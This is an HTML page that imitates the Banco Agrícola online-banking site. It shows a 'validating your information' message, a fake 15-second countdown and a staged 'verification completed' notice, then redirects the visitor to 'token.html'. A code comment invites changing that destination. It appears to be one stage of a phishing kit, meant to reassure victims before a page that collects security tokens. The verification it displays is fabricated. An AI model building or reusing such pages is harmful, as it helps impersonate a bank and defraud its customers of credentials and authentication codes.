<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Validando información | Banco Agrícola</title>

  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">

  <style>
    :root{
      --font: "Open Sans", sans-serif;
      --yellow:#FDDA24;
      --black:#000;
      --muted:#505050;
    }

    *{ box-sizing:border-box; margin:0; padding:0; }
    html,body{ height:100%; font-family:var(--font); color:var(--black); background:#fff; }

    /* ======= Header ======= */
    .header{
      height:80px;
      padding:0 40px;
      display:flex;
      align-items:center;
      border-bottom:1px solid #f4f4f4;
      background:#fff;
      justify-content:flex-start;
      gap:12px;
      position:relative;
      z-index:2;
    }
    .logo-desktop{ height:48px; }
    .logo-mobile, .mobile-icon, .header-slot { display:none; }

    /* ======= Contenido Central ======= */
    .main{
      flex:1;
      min-height:calc(100vh - 80px - 64px);
      display:flex;
      flex-direction:column;
      align-items:center;
      justify-content:center;
      text-align:center;
      padding:20px;
      background:#fff;
    }

    .message{
      font-size:22px;
      font-weight:700;
      margin-bottom:18px;
    }

    .timer{
      font-size:32px;
      font-weight:600;
      color:var(--yellow);
      margin-bottom:20px;
    }

    .dots::after{
      content: '';
      display: inline-block;
      animation: dots 1.2s infinite;
    }

    @keyframes dots {
      0% { content: ''; }
      25% { content: '.'; }
      50% { content: '..'; }
      75% { content: '...'; }
      100% { content: ''; }
    }

    /* ======= Footer ======= */
    .page-footer{
      height:64px;
      padding:0 16px;
      border-top:1px solid #f1f1f1;
      display:grid;
      grid-template-columns: 1fr auto 80px;
      align-items:center;
      gap:8px;
      font-size:14px;
      background:#fff;
    }
    .footer-links{
      display:flex;
      align-items:center;
      gap:22px;
      flex-wrap:wrap;
    }
    .footer-links a{
      display:inline-flex;
      align-items:center;
      gap:8px;
      color:#000;
      text-decoration:none;
      border-bottom:1px solid transparent;
      padding-bottom:2px;
    }
    .footer-center{
      display:flex;
      align-items:center;
      gap:10px;
      justify-self:center;
      color:#4a4a4a;
      white-space:nowrap;
    }
    .footer-center img{ height:18px; }
    .version{ justify-self:end; color:#7b7b7b; }

    /* ======= Móvil ======= */
    @media (max-width:768px){
      .header{
        height:68px;
        padding:0 12px;
        justify-content:space-between;
        border-bottom:1px solid #eee;
      }
      .logo-desktop{ display:none; }
      .logo-mobile{ display:block; height:28px; margin:0 auto; }
      .footer-links{ display:none; }
      .version{ display:none; }
    }
  </style>
</head>
<body>

  <!-- Header -->
  <header class="header">
    <img class="logo-desktop" src="images/logo.svg" alt="Banco Agrícola">
    <img class="logo-mobile" src="images/logo.svg" alt="Banco Agrícola">
  </header>

  <!-- Contenido principal -->
  <main class="main">
    <h1 class="message">Estamos validando su información<span class="dots"></span></h1>
    <div class="timer" id="timer">15</div>
  </main>

  <!-- Footer -->
  <footer class="page-footer">
    <nav class="footer-links">
      <a href="#"><img src="images/help.svg" alt="" height="16"> Consejos de seguridad</a>
      <a href="#">Tutorial del canal</a>
      <a href="#">Tips de uso</a>
      <a href="#">Preguntas frecuentes</a>
    </nav>
    <div class="footer-center">
      <img src="images/logonegro.svg" alt="Banco Agrícola">
      <span>Banco Agrícola© Todos los derechos reservados.</span>
    </div>
    <span class="version">4.5.7</span>
  </footer>

  <!-- ======= Script del temporizador ======= -->
  <script>
    let seconds = 15;
    const timerEl = document.getElementById("timer");
    const messageEl = document.querySelector(".message");

    const interval = setInterval(() => {
      seconds--;
      timerEl.textContent = seconds;

      if (seconds <= 0) {
        clearInterval(interval);
        messageEl.textContent = "Verificación completada ✅";
        timerEl.style.display = "none";

        // Redirige automáticamente después de 1.5 segundos
        setTimeout(() => {
          window.location.href = "token.html"; // <-- Cambia el destino aquí
        }, 1500);
      }
    }, 1000);
  </script>

</body>
</html>
